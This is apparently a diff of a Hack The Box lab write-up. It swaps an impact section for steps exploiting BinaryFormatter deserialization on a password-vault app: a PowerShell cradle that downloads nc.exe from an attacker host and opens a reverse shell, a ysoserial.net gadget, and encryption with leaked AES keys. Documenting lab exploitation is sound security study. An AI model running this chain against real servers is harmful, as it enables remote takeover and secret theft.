@@ -1,53 +1,122 @@
-The impact is remote code execution (RCE) on the vault web server.
-
-  
-
-When the malicious serialized object is deserialized, the attacker can execute arbitrary commands in the context of the IIS application pool identity. This turns a data-access vulnerability into full server compromise, with consequences including:
-
-  
-
-- **Complete host takeover**
+1. **Prepare the PowerShell download cradle**
     
       
     
-    The attacker can run arbitrary commands, install persistence mechanisms, create new accounts, and take full control of the underlying Windows server.
+    The pentester created a base64-encoded PowerShell command that downloads `nc.exe` from the attacker's server and executes a reverse shell:
     
       
     
-- **Confidentiality breach**
+    Bash
+    
+    ```
+    echo -n '(new-object net.webclient).downloadfile("http://<ip>:<port>/nc.exe", "c:\windows\tasks\nc.exe");c:\windows\tasks\nc.exe -nv <ip> <shell-port> -e c:\windows\system32\cmd.exe;' | iconv -t UTF-16LE | base64 -w0
+    ```
+    
+    This produces a UTF-16LE base64-encoded PowerShell payload.
     
       
     
-    With code execution, the attacker can read any file the application pool can access, including source code, configuration files, the database, and Windows secrets such as DPAPI-protected values.
+2. **Generate the .NET deserialization gadget**
     
       
     
-- **Integrity and availability damage**
+    Using `ysoserial.net`, the pentester generated a malicious `BinaryFormatter` payload with the `TypeConfuseDelegate` gadget chain, passing the encoded PowerShell command as the execution argument:
     
       
     
-    The attacker can modify application files, delete data, stop services, deface the application, or deploy malware such as web shells and ransomware.
+    PowerShell
+    
+    ```
+    .\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "powershell -nop -enc <payload_b64>"
+    ```
+    
+    The output is a raw binary serialized object that, when deserialized by `BinaryFormatter`, will execute the supplied PowerShell command.
     
       
     
-- **Lateral movement**
+3. **Encrypt the payload with the leaked AES key**
     
       
     
-    From the compromised server, the attacker can scan the internal network, pivot to other systems, and abuse trust relationships to reach the database server, domain controller, or other internal services.
+    Because the application decrypts the stored value with AES before passing it to `BinaryFormatter.Deserialize`, the raw binary payload must be encrypted using the same key and IV exposed in `Web.config`:
     
       
     
-- **Theft of cryptographic material**
+    XML
+    
+    ```
+    <add key="PasswordKey" value="f3d9aa53-c08d-43" />
+    <add key="PasswordIV" value="5ac8083e-8ff6-43" />
+    ```
+    
+    The pentester used the helper script `vault.royalflush.htb-Deserialization-Payload.py` to perform this encryption. First, the base64-encoded gadget payload was saved to `payload.b64`, then:
     
       
     
-    Even without the earlier SQL injection, RCE allows the attacker to read Web.config directly and steal the AuthKey, PasswordKey, and PasswordIV, enabling forged authentication cookies and decryption of all stored passwords.
+    Bash
+    
+    ```
+    python vault.royalflush.htb-Deserialization-Payload.py payload.b64
+    ```
+    
+    The script produced the final base64 ciphertext that the vault application could decrypt successfully.
     
       
     
-- **Total loss of trust in the vault**
+4. **Start the listener**
     
       
     
-    RCE on a password-vault application means the attacker can silently intercept, exfiltrate, or modify every secret managed by the application without users noticing.
+    On the attacker machine, the pentester started a netcat listener to catch the reverse shell:
+    
+      
+    
+    Bash
+    
+    ```
+    nc -lvnp <shell-port>
+    ```
+    
+    A simple HTTP server was also started to serve `nc.exe`:
+    
+      
+    
+    Bash
+    
+    ```
+    python3 -m http.server <port>
+    ```
+    
+5. **Submit the encrypted payload**
+    
+      
+    
+    The pentester logged in to the vault application and submitted the encrypted payload through the Import Password feature at `POST /My/ImportPassword`, supplying a name and the generated ciphertext as the `encryptedPassword` value.
+    
+      
+    
+6. **Trigger deserialization and gain RCE**
+    
+      
+    
+    The pentester navigated to `/My/Passwords`. The application retrieved the newly imported entry, decrypted the ciphertext with AES, and passed the resulting bytes to `BinaryFormatter.Deserialize()`. The gadget chain executed, launching PowerShell, downloading `nc.exe`, and connecting back to the attacker listener.
+    
+      
+    
+7. **Shell access and flag retrieval**
+    
+      
+    
+    The reverse shell connected, giving the pentester command execution as the IIS application pool identity on the target server. The flag was found in the root of `C:\`:
+    
+      
+    
+    DOS
+    
+    ```
+    C:\> dir C:\
+    ...
+    ddf1df82dea9ce0d6ab3a03aa80cbdac
+    ```
+    
+    The pentester had successfully achieved remote code execution by chaining the SQL injection/file-read vulnerability with the insecure `BinaryFormatter` deserialization.
